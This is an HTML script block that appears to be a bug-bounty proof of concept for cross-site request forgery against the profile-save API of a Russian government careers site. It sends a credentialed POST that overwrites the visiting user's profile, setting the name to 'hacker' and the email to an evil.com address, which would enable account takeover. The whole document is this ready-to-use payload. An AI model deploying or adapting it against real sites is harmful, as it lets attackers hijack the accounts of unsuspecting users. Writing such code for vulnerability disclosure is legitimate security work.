<script>
	var url="https://gossluzhba.gov.ru/api/member/profile/save";
	var data=({"login":"successful@k66.ru","firstName":"hacker","middleName":"hacker","lastName":"hacker","birthDate":"01.01.1990","email":"hacker1337@evil.com","organizationName":null,"postAndOrganizationName":null,"officialEmail":null,"officialPhone":null,"remoteWorkingAddress":null,"registrationAddress":null,"actualAddress":null,"position":null,"inn":null,"birthplace":null,"passportInfo":null,"insuranceCertificateNumber":"437 379 889 45","isEmployee":false});

	fetch(url, {
        method: 'POST',
        credentials: 'include',
        headers: {
            "Content-Type": "application/json;charset=UTF-8",
            "X-Bug-Bounty": "3aa7287a49c4843572bb88905405935902b1886851809383a3c21c3dc71e829c"
          },
          body: JSON.stringify(data),
    	})
</script>
